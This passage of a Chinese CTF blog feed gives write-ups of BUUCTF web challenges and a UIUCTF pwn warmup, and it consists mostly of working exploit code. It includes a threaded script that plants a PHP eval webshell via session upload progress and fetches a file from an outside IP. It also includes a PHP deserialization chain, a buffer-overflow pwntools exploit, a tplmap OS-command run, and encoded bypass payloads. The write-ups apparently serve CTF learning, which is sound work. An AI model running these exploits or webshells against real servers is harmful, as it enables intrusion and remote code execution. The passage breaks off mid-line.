fault特性。</code></p><p><code>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</code></p><p><code>php &lt; 7.2</code><br><code>php://filter/string.strip_tags/resource=/etc/passwd</code></p><p><code>php7 老版本通杀</code><br><code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span class="string">&quot;http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a><code>session.upload_progress</code></h3><p><code>php版本是7.0.33，大于5.4，可以尝试利用session.upload_progress进行session文件包含：</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/8/2 12:39</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : session.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;upload&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/tmp/sess_&#x27;</span> + sessid</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;cf&#x27;</span> : payload,</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;echo &#x27;11111111111&#x27;;copy(&#x27;http://47.94.0.250/2.txt&#x27;,&#x27;/tmp/mc&#x27;);&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#file_put_contents(&#x27;/tmp/2.txt&#x27;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;)</span></span><br><span class="line">poy = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c23abde6-a0a1-4078-804d-9ea570d5f263.node4.buuoj.cn/flflflflag.php&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; ,headers=burp0_headers)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=url+<span class="string">&#x27;?file=&#x27;</span>+payload,data=data,headers=burp0_headers)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        print(resp.url)</span><br><span class="line">        print(resp.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure><p>我个人需要这样的是！这两种<code>getshell</code>的地方是不是一样的！session那个应该是生成的session的文件！</p><p><code>/tmp</code>目录下生成临时文件 是上传文件的临时文件！ 上传的临时文件可能可能session文件放的位置不一样！注意了！🙄</p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><h2 id="知识点：nodejs-vm逃逸"><a href="#知识点：nodejs-vm逃逸" class="headerlink" title="知识点：nodejs vm逃逸"></a>知识点：nodejs vm逃逸</h2><p>我不熟！太难了！ 看师傅门的文章把！像这种题！理解把！也只能看看js的代码了！</p><p>报错 <code>Errot().stack</code></p><p><code>https://blog.csdn.net/qq_43478096/article/details/109231567?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.control</code></p><h1 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h1><h2 id="知识点：php代码审计！"><a href="#知识点：php代码审计！" class="headerlink" title="知识点：php代码审计！"></a>知识点：php代码审计！</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;my_is_upload&#x27;</span>];</span><br><span class="line">$profile-&gt;my_is_upload = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">&quot;122&quot;</span>;</span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/a.php&quot;</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/my_is_upload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="literal">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码审计的时候很头疼 掉头发！ 但是一下子通的感觉太爽了！😋😋😋😋</p><p>思路：</p><p>通过register类当入口！调用profile类<code>__call</code>方法！ 在通过<code>__call</code>方法调用<code>__get</code>方法！ 最后回到</p><p><code>$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</code> 调用<code>my_is_upload()</code>  就是调用<code>upload_img方法！</code></p><p>方法内前两个if都绕过了！不执行！直接：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>保证上传的是图片🐎就行！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile-&gt;filename_tmp = <span class="string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/a.php&quot;</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/my_is_upload.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>😶😶 不知道为啥 越来越喜欢慢慢看代码了！ </p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <summary type="html">BUU WEB ezinclude</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>WEBPWN</title>
    <link href="http://upload.love/2021/08/01/WEBPWN-1/"/>
    <id>http://upload.love/2021/08/01/WEBPWN-1/</id>
    <published>2021-08-01T01:57:51.000Z</published>
    <updated>2021-08-04T04:00:25.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UIUCTF-2021"><a href="#UIUCTF-2021" class="headerlink" title="UIUCTF 2021"></a><a href="https://uiuc.tf/">UIUCTF 2021</a></h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Pwn-Warmup"><a href="#Pwn-Warmup" class="headerlink" title="Pwn Warmup"></a>Pwn Warmup</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/8/1 10:01</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : Pwn Warmup.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;give_flag = 0x80485ab</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;x86&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># give_flag = 0x80485ab</span></span><br><span class="line">give_flag = <span class="number">0x565b72ad</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;./challenge&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;pwn-warmup.chal.uiuc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!!]The exp is content error ~&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">4</span>)</span><br><span class="line">        payload = payload + p32(give_flag)</span><br><span class="line">        print(payload)</span><br><span class="line">        print(<span class="number">111111</span>)</span><br><span class="line">        upload.recvuntil(<span class="string">&quot;&amp;give_flag = 0x80485ab\n&quot;</span>)</span><br><span class="line">        upload.sendline(payload)</span><br><span class="line">        upload.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打不通！远程连接的时候发现<code>give_flag</code>地址一直在变！</p><p>跟新换代太快了！算了！ 刷会题目把！</p><h2 id="BUUweb"><a href="#BUUweb" class="headerlink" title="BUUweb"></a>BUUweb</h2><h3 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h3><h4 id="知识点：后台rce"><a href="#知识点：后台rce" class="headerlink" title="知识点：后台rce"></a>知识点：后台rce</h4><p>这啥呀！ 注册后！后台文件上传 getshell！没过滤的！服了！</p><h3 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h3><h4 id="知识点：模版注入"><a href="#知识点：模版注入" class="headerlink" title="知识点：模版注入"></a>知识点：模版注入</h4><ol><li><strong>Jinjia2模版注入</strong></li><li><strong>Arjun</strong>参数爆破工具</li><li><strong>tplmap</strong>模版注入工具</li></ol><p>2个工具字节秒！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS G:\buuctf工具\Arjun<span class="number">-2.0</span>-beta&gt; python3 arjun.py -u http://e7cf1be7<span class="number">-69</span>c9<span class="number">-461</span>b<span class="number">-85</span>fe<span class="number">-14</span>b9f1f1273a.node4.buuoj.cn/ -m GET -c <span class="number">200</span> --stable</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python  tplmap.py -u <span class="string">&#x27;http://e7cf1be7-69c9-461b-85fe-14b9f1f1273a.node4.buuoj.cn/?name=1*&#x27;</span> --os-cmd  whoami</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h3><h4 id="知识点：php代码审计"><a href="#知识点：php代码审计" class="headerlink" title="知识点：php代码审计"></a>知识点：php代码审计</h4><p>这个题挺不错的！</p><p>但是我本地打通了远程打不通！？？？？？</p><p>我服了！ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">debu=aqua_is_cute</span><br><span class="line">%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a</span><br><span class="line"></span><br><span class="line">shana[]=<span class="number">1</span></span><br><span class="line">%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">5</span>b%<span class="number">5</span>d=<span class="number">1</span></span><br><span class="line">passwd[]=<span class="number">2</span></span><br><span class="line">%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">5</span>b%<span class="number">5</span>d=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">file=data:<span class="comment">//text/plain,debu_debu_aqua</span></span><br><span class="line">file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>f%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span></span><br><span class="line"></span><br><span class="line">flag[code] = !!</span><br><span class="line">%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">5</span>d=!!</span><br><span class="line"></span><br><span class="line">flag[code] = create_function</span><br><span class="line">&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">5</span>d=%<span class="number">63</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">5</span>f%<span class="number">66</span>%<span class="number">75</span>%<span class="number">6</span>e%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e</span><br><span class="line">flag[arg] =  ;&#125;var_dump(get_defined_vars());<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag[arg] =;&#125;var_dump(<span class="keyword">require</span>(~(%<span class="number">8</span>F%B7%<span class="number">8</span>F%C5%D0%D0%B9%<span class="number">96</span>%<span class="number">93</span>%AB%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F)));<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">5</span>d=;&#125;var_dump(<span class="keyword">require</span>(~%<span class="number">8</span>F%B7%<span class="number">8</span>F%C5%D0%D0%B9%<span class="number">96</span>%<span class="number">93</span>%AB%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F));<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">5</span>d=;&#125;var_dump(<span class="keyword">require</span>(~(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%c5%d0%d0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">8</span>d%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%<span class="number">9</span>b%c2%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>a%<span class="number">8</span>d%<span class="number">8</span>b%d1%<span class="number">9</span>d%<span class="number">9</span>e%<span class="number">8</span>c%<span class="number">9</span>a%c9%cb%d2%<span class="number">9</span>a%<span class="number">91</span>%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">9</span>b%<span class="number">9</span>a%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">8</span>c%<span class="number">90</span>%<span class="number">8</span>a%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a%c2%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%ce%<span class="number">99</span>%<span class="number">93</span>%cb%<span class="number">98</span>%d1%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f)));<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">5</span>d=%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">75</span>%<span class="number">6</span>d%<span class="number">70</span>%<span class="number">28</span>%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">64</span>%<span class="number">5</span>f%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">73</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>b%<span class="number">2</span>f%<span class="number">2</span>f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line"></span><br><span class="line">debu=__&amp;file=!!</span><br><span class="line"></span><br><span class="line">file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>f%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">5</span>b%<span class="number">5</span>d=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">5</span>b%<span class="number">5</span>d=<span class="number">2</span>&amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>f%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>A&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">18</span>+<span class="number">4</span>+<span class="number">6</span>W820367809</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">requset(~%<span class="number">8</span>F%B7%<span class="number">8</span>F%C5%D0%D0%B9%<span class="number">96</span>%<span class="number">93</span>%AB%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F)</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">require</span>(~(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%c5%d0%d0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">8</span>d%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%<span class="number">9</span>b%c2%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>a%<span class="number">8</span>d%<span class="number">8</span>b%d1%<span class="number">9</span>d%<span class="number">9</span>e%<span class="number">8</span>c%<span class="number">9</span>a%c9%cb%d2%<span class="number">9</span>a%<span class="number">91</span>%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">9</span>b%<span class="number">9</span>a%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">8</span>c%<span class="number">90</span>%<span class="number">8</span>a%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a%c2%<span class="number">8</span>d%<span 